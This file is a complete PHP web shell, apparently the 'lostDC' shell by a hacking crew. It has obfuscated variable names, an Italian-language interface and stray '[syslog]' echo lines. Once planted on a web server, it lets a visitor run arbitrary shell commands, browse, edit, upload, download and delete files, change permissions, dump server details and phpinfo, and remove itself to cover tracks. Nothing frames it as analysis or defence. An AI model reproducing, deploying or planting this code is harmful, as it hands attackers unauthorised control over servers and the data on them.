<?php
?>
 <?php  echo '[syslog]01
'; if (!function_exists('getTime')) { function getTime() { list($sp2a42d2, $spb2233d) = explode(' ', microtime()); return (double) $sp2a42d2 + (double) $spb2233d; } } define('startTime', getTime()); if (!function_exists('shellexec')) { function shellexec($sp7bd36a) { global $sp7c1f07; $spea30d5 = ''; if (!empty($sp7bd36a)) { if (is_callable('exec') and !in_array('exec', $sp7c1f07)) { exec($sp7bd36a, $spea30d5); $spea30d5 = join('
', $spea30d5); } elseif (($spea30d5 = `{$sp7bd36a}`) !== FALSE) { } elseif (is_callable('system') and !in_array('system', $sp7c1f07)) { $spe2ff4f = ob_get_contents(); ob_clean(); system($sp7bd36a); $spea30d5 = ob_get_contents(); ob_clean(); echo $spe2ff4f; } elseif (is_resource($sp694629 = popen($sp7bd36a, 'r'))) { $spea30d5 = ''; while (!feof($sp694629)) { $spea30d5 .= fread($sp694629, 1024); } pclose($sp694629); } } return $spea30d5; } } echo '[syslog]02
'; function getperms($spa3ecf0) { $spb69e60 = substr(sprintf('%o', fileperms($spa3ecf0)), -4); return $spb69e60; } if (!function_exists('view_size')) { function view_size($sp92ea66) { if (!is_numeric($sp92ea66)) { return FALSE; } else { if ($sp92ea66 >= 1073741824) { $sp92ea66 = round($sp92ea66 / 1073741824 * 100) / 100 . ' GB'; } elseif ($sp92ea66 >= 1048576) { $sp92ea66 = round($sp92ea66 / 1048576 * 100) / 100 . ' MB'; } elseif ($sp92ea66 >= 1024) { $sp92ea66 = round($sp92ea66 / 1024 * 100) / 100 . ' KB'; } else { $sp92ea66 = $sp92ea66 . ' B'; } return $sp92ea66; } } } function getinfo() { $spea4fcd = ''; $spea4fcd .= '[~]Versione PHP: ' . phpversion() . '<br />'; $spea4fcd .= '[~]Server: ' . $_SERVER['HTTP_HOST'] . '<br />'; $spea4fcd .= '[~]Indirizzo IP: ' . $_SERVER['SERVER_ADDR'] . '<br />'; $spea4fcd .= '[~]Software: ' . $_SERVER['SERVER_SOFTWARE'] . '<br />'; $spea4fcd .= '[~]Charset: ' . $_SERVER['HTTP_ACCEPT_CHARSET'] . '<br />'; $spea4fcd .= ini_get('safe_mode') == 0 ? '[~]Safe Mode: <font color="#00FF33">OFF</font><br />' : '[~]Safe Mode: <font color="#FF3300">OFF</font><br />'; $spea4fcd .= ini_get('magic_quotes_gpc') == 0 ? '[~]Magic Quotes: <font color="#00FF33">OFF</font><br />' : '[~]Magic Quotes: <font color="#FF3300">ON</font><br />'; if (is_callable('true')) { $sp6bf0a4 = realpath('.'); $sp7997f0 = 'true'; $sp8a3200 = 'true'; if ($sp7997f0 === FALSE || $sp7997f0 < 0) { $sp7997f0 = 0; } if ($sp8a3200 === FALSE || $sp8a3200 < 0) { $sp8a3200 = 0; } $sp2f5415 = $sp8a3200 - $sp7997f0; $spea4fcd .= '[~]Free space: ' . view_size($sp7997f0) . '/' . view_size($sp8a3200) . '<br />'; } return $spea4fcd; } if (!isset($_GET['dir'])) { $spa25e24 = getcwd(); } else { $spa25e24 = $_GET['dir']; } chdir($spa25e24); $spef6053 = getcwd(); $sp76d016 = '?dir=' . $spef6053; $sp7ccd8a = '<html>
    <head>
        <title>lostDC - ' . $spef6053 . '</title>
        <style type="text/css">
        body {
            color: #FFFFFF;
            background-color: black;
            font-family: Courier New, Verdana, Arial;
            font-size: 11px;
            cursor: crosshair;
        }
        a:link {
            color: #FFFFFF;
            text-decoration: none;
        }
        a:visited {
            color: #FFFFFF;
            text-decoration: none;
        }
        a:hover {
            cursor: crosshair;
             text-decoration: none;
            color: #808080;
        }
        a.head {
            text-decoration: none;
            text-color: #FF0000;
        }
        a.head:hover {
            cursor: crosshair;
            text-decoration: none;
            color: #FF0000;
        }
        table {
            font-size: 11px;
        }
        td.list {
            border: 1px solid white;
            font-size: 11px;
        }
        td.list:hover {
            background: #222;
        }
        #info {
            font-size:            12px;
            width:                50%;
            margin-left:        20%;
            text-align: left;
        }
        #foot {
            font-size:            12px;
            width:                65%;
            margin-left:        20%;
            text-align: left;
        }
        input:hover, textarea:hover {
            background: #808080;
            cursor: crosshair;
        }
        #perm {
            color: #FF0000;
        }

    </style>
    </head>
    <body>'; print $sp7ccd8a . '<center><a href = "' . $_SERVER['PHP_SELF'] . '"><img src = "http://img367.imageshack.us/img367/9834/bannerdc2bygu.png" border = "none"></a></center>'; print '<hr size="1" width="60%" noshade />
<div id = "info">[~]Directory corrente: ' . getcwd() . '<br />' . getinfo() . '</div>
<hr size="1" width="60%" noshade />'; print '<table width = 60% height = 10% align = "center">
'; print '<tr>
'; print '<td>[ <a class = "head" href = \'' . $sp76d016 . '&mode=create\'>New</a> ]</td>
'; print '<td>[ <a class = "head" href = \'' . $sp76d016 . '&mode=phpinfo\'>PHP Info</a> ]</td>
'; print '<td>[ <a class = "head" href = \'' . $sp76d016 . '&mode=nopaste&action=ins\'>No-Paste</a> ]</td>
'; print '<td>[ <a class = "head" href = \'' . $sp76d016 . '&mode=execute\'>Shell Command</a> ]</td>
'; print '<td>[ <a class = "head" href = \'' . $sp76d016 . '&mode=hasher\'>Hasher</a> ]</td>
'; print '<td>[ <a class = "head" href = \'' . $sp76d016 . '&mode=selfremove\'>Self Remove</a> ]</td>
'; print '</tr></table><center>'; echo '[syslog]03
'; $sp9dace2 = $_GET['mode']; switch ($sp9dace2) { case 'edit': $spa3ecf0 = $_GET['file']; $spe29637 = $_POST['new']; if (empty($spe29637)) { $sp694629 = fopen($spa3ecf0, 'r'); $spdd6db5 = fread($sp694629, filesize($spa3ecf0)); $spdd6db5 = str_replace('<textarea>', '<textarea>', $spdd6db5); print '<form action = \'' . $sp76d016 . '&mode=edit&file=' . $spa3ecf0 . '\' method = \'POST\'>
'; print 'File: ' . $spa3ecf0 . '<br />
'; print '<textarea name = \'new\' rows = \'25\' cols = \'100\'>' . $spdd6db5 . '</textarea><br />
'; print '<input type = \'submit\' value = \'Edit\'></form>
'; } else { $sp694629 = fopen($spa3ecf0, 'w'); if (fwrite($sp694629, $spe29637)) { header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?dir=' . $spa25e24); } else { print 'Impossibile editare ' . $spa3ecf0 . '<br />
'; echo '<a href="javascript:history.go(-1)">Indietro</a><br /><br />
'; } } fclose($sp694629); break; case 'upload': $sp4eb460 = $_FILES['file']['tmp_name']; $spa3ecf0 = basename($_FILES['file']['name']); if (!empty($spa3ecf0)) { if (move_uploaded_file($sp4eb460, $spa3ecf0)) { header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?dir=' . $spa25e24); } else { print 'Impossibile caricare ' . $spa3ecf0 . '
'; echo '<a href="javascript:history.go(-1)">Indietro</a><br /><br />
'; } } break; case 'download': $spbc6552 = $_GET['filename']; header('Pragma: no-cache'); header('Expires: 0'); header('Content-type: application/octet-stream'); header('Content-Disposition: attachment; filename=' . $spbc6552 . ';'); header('Content-Description: Download manager'); header('Content-Length: ' . filesize($spbc6552)); readfile($spbc6552); break; case 'rename': $spabe083 = $_GET['old']; print '<form action = \'' . $sp76d016 . '&mode=rename&old=' . $spabe083 . '\' method = \'POST\'>
'; print 'New name: <input name = \'new\'><br />
'; print '<input type = \'submit\' value = \'Rename\'></form>
'; $spe29637 = $_POST['new']; if (!empty($spe29637)) { if (rename($spabe083, $spe29637)) { header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?dir=' . $spa25e24); } else { print 'Impossibile rinominare ' . $spabe083 . '.<p>
'; echo '<a href="javascript:history.go(-1)">Indietro</a><br /><br />
'; } } break; case 'chmod': if (chmod($_POST['tomod'], intval($_POST['mod'], 8)) == false) { print 'Impossibile cambiare i permessi a ' . $_POST['tomod'] . '<br />'; echo '<a href="javascript:history.go(-1)">Indietro</a><br /><br />
'; } else { header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?dir=' . $spa25e24); } break; case 'remove': $spa3ecf0 = $_GET['file']; if (unlink($spa3ecf0)) { header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?dir=' . $spa25e24); } else { print 'Impossibile rimuovere ' . $spa3ecf0 . ' <br />
'; echo '<a href="javascript:history.go(-1)">Indietro</a><br /><br />
'; } break; case 'selfremove': header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?dir=' . $spa25e24 . '&mode=remove&file=' . __FILE__); break; case 'makedir': if (mkdir($_POST['dir'], 511) == false) { print 'Impossibile creare directory; ' . $_POST['dir'] . ' <br />
'; echo '<a href="javascript:history.go(-1)">Indietro</a><br /><br />
'; } else { header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']); } break; case 'godir': $spa7e9d6 = $_POST['goto']; if (isset($_POST['goto'])) { chdir($spa7e9d6); header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . $sp76d016 . '/' . $spa7e9d6); } else { header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']); } break; case 'elimina': $sp6d4d1e = $_GET['dire']; if ($spc1a0af = opendir($sp6d4d1e)) { $sp6dfc07 = array(); while (false != ($spa3ecf0 = readdir($spc1a0af))) { if ($spa3ecf0 != '.' && $spa3ecf0 != '..') { if (is_dir($sp6d4d1e . $spa3ecf0)) { if (!rmdir($sp6d4d1e . $spa3ecf0)) { delete_directory($sp6d4d1e . $spa3ecf0 . '/'); } } else { unlink($sp6d4d1e . $spa3ecf0); } } } closedir($spc1a0af); rmdir($sp6d4d1e); } header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?dir=' . $spa25e24); break; case 'create': $spe29637 = $_POST['new']; if (isset($_POST['new'])) { if (!empty($spe29637)) { if ($sp694629 = fopen($spe29637, 'w')) { header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?dir=' . $spa25e24); } else { print 'Impossibile creare ' . $spa3ecf0 . '.<p>
'; echo '<a href="javascript:history.go(-1)">Indietro</a></center><br /><br />
'; } fclose($sp694629); } } else { print '<form action = \'' . $sp76d016 . '&mode=create\' method = \'POST\'>
'; print '<tr><td>New file: <input name = \'new\'></td>
'; print '<td><input type = \'submit\' value = \'Create\'></td></tr></form>
'; } break; case 'nopaste': switch ($_GET['action']) { case 'ins': print '<form action \'' . $sp76d016 . '&action=ins\' method = \'POST\'>
'; print 'Title: <input type = \'text\' name = \'title\'><br />
'; print 'Language: <input type = \'text\' name = \'language\'><br />
'; print 'Script: <br /><textarea name = \'source\' rows = \'30\' cols = \'50\'></textarea><br />
'; print '<input type = \'submit\' value = \'Submit\'></form>
'; if (!empty($_POST['title']) && !empty($_POST['language']) && !empty($_POST['source'])) { $spa3ecf0 = rand(1000000, 9999999); $sp694629 = fopen($spa3ecf0, 'w'); fwrite($sp694629, $_POST['title'] . '
' . $_POST['language'] . '

' . $_POST['source']); fclose($sp694629); header("Location: {$sp76d016}&mode=nopaste&action=view&id={$spa3ecf0}"); } break; case 'view': $sp5904ca = $_GET['id']; $sp694629 = fopen($sp5904ca, 'r'); $sp437738 = fread($sp694629, filesize($sp5904ca)); print '<table border = \'1\'>
<tr>
<td>
<pre>' . htmlentities($sp437738) . '</pre></td>
</tr>
</table>
'; fclose($sp694629); break; } break; case 'execute': $spfe16e8 = $_POST['command']; if (!isset($_POST['command'])) { print '<table>
<form action = \'' . $sp76d016 . '&mode=execute\' method = \'POST\'>
'; print '<tr>
<td><input type = \'text\' name = \'command\'></td>
</tr>
'; print '<tr>
<td><input type = \'submit\' value = \'Execute\'></td>
</tr>
</form>
</table>'; } else { $spe6a02a = shellexec($spfe16e8); if ($spe6a02a == '') { print 'Il comando non puo\' essere eseguito sul server<br /><br /><br />
'; } else { print 'Executing the following command:<br />
'; print '<textarea rows = \'5\' cols = \'60\'>' . $spfe16e8 . '</textarea><br />
'; print 'Result:<br /> <textarea rows = \'5\' cols = \'60\'>' . $spe6a02a . '</textarea><br /><br /><br />
'; } } break; case 'hasher': print '<table>
<form action = \'' . $sp76d016 . '&mode=hasher\' method = \'POST\'>
'; print '<tr>
<td><input type = \'text\' name = \'hash\'></td>
</tr>
'; print '<tr>
<td><select name = \'type\'>
'; print '<option>md4</option>
'; print '<option>md5</option>
'; print '<option>sha1</option>
'; print '<option>gost</option>
'; print '<option>crc32</option>
'; print '<option>adler32</option>
'; print '<option>whirlpool</option>
'; print '</select></td>
</tr>'; print '<tr>
<td><input type = \'submit\' value = \'hash\'></td>
</tr></form>
</table>'; if (!empty($_POST['hash']) && !empty($_POST['type'])) { print $_POST['hash'] . ': ' . '<b>' . hash($_POST['type'], $_POST['hash']) . '</b>'; } break; case 'phpinfo': phpinfo(); break; default: print '<table style = "border: 1px solid black;" width="60%">
'; $sp9f4c7d = scandir($spa25e24); foreach ($sp9f4c7d as $sp7a2456) { if (is_file($sp7a2456)) { print '<tr>
<td width = "55%" class = "list"><a href = ' . $sp76d016 . '&mode=download&filename=' . $sp7a2456 . '>' . $sp7a2456 . '</a></td>
'; print '<td width = "10%" class = "list">' . view_size(filesize($sp7a2456)) . '</td>'; print '<td class = "list"><div id = "perm">' . getperms($sp7a2456) . '</div></td>
'; print '<td class = "list" align = "right"><a href = \'' . $sp76d016 . '&mode=edit&file=' . $sp7a2456 . '\'><img src = \'http://img189.imageshack.us/img189/9858/editj.gif\' alt = "edita file" border = "none"></a>
                <a href = \'' . $sp76d016 . '&mode=remove&file=' . $sp7a2456 . '\'><img src = \'http://img193.imageshack.us/img193/9589/deletef.gif\' alt = "elimina file" border = "none"></a>
                <a href = \'' . $sp76d016 . '&mode=rename&old=' . $sp7a2456 . '\'><img src = \'http://img51.imageshack.us/img51/7241/replyl.gif\' alt = "rinomina file" border = "none"></a>
                </td>
</tr>'; } else { if ($sp7a2456 != '.' && $sp7a2456 != '..') { print '<tr>
<td width = "55%" class = "list"><a href = ' . $sp76d016 . '/' . $sp7a2456 . '>' . $sp7a2456 . '</a></td>
'; print '<td width = "10%" class = "list">FOLDER</td>'; print '<td class = "list"><div id = "perm">' . getperms($sp7a2456) . '</div></td>
'; print '<td class = "list" align = "right"><a href = \'' . $sp76d016 . '&mode=elimina&dire=' . $sp7a2456 . '\'><img src = \'http://img193.imageshack.us/img193/9589/deletef.gif\' alt = "elimina directory" border = "none"></a></td>
</tr>'; } if ($sp7a2456 == '..') { print '<td width = "55%" class = "list"><a href = ' . $sp76d016 . '/' . $sp7a2456 . '>..</a></td>
'; } } } print '</table>
'; } print '</center>
<hr size="1" width="60%" noshade />'; print '
</hr>'; print '<table id = "foot">
           <tr>
               <td width = "40%">
                   <form action = \'' . $sp76d016 . '&mode=upload\' method = \'POST\' ENCTYPE=\'multipart/form-data\'>
                           Upload file: <input type = \'file\' name = \'file\'>
                           <input type = \'submit\' value = \'Upload\'>
                   </form>
               </td>
               <td width = "50%">
                       <form method="POST" action="' . $sp76d016 . "&mode=chmod\">\n                           Chmod File: <input type=\"text\" name=\"tomod\" value = \"filename\"> \n                           <input type=\"number\" name=\"mod\" value = \"0666\"> \n                           <input type=\"submit\" name=\"submit\" value=\"Chmod\">\n                       </form>\n               </td>\n           </tr>\n           <tr>\n                   <td width = \"40%\">\n                       <form method=\"POST\" action=\"?dir='.{$sp76d016}.'&mode=makedir\">\n                           Mkdir: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type=\"text\" name=\"dir\" value=\"namedir\"> \n                           <input type=\"submit\" name=\"submit\" value=\"Create\">\n                    </form>\n                   </td>\n                   <td width = \"50%\">\n                       <form action = '" . $sp76d016 . "&mode=create' method = 'POST'>\n                        New file:&nbsp;&nbsp; <input name = 'new'>\n                        <input type = 'submit' value = 'Create'></form>\n                   </td>\n           </tr>\n           <tr>\n            <td>\n                <form method = \"POST\" action = \"?dir='.{$sp76d016}.'&mode=godir\">\n                    Go dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input name = 'goto'>\n                    <input type = 'submit' value = 'Go'>\n                </form>\n            </td>\n           </tr>\n       </table><hr size=\"1\" width=\"60%\" noshade />\n</hr>"; print '<center>[ Generation time: ' . round(getTime() - startTime, 4) . ' seconds | by <a href="http://lostpassword.hellospace.net">lostpassword</a> and <a href = "http://www.d3vilc0de.org">D3vilc0de crew</a> ]</center>
</body>
</html>'; echo '[syslog]05
'; ?>
 
<?php 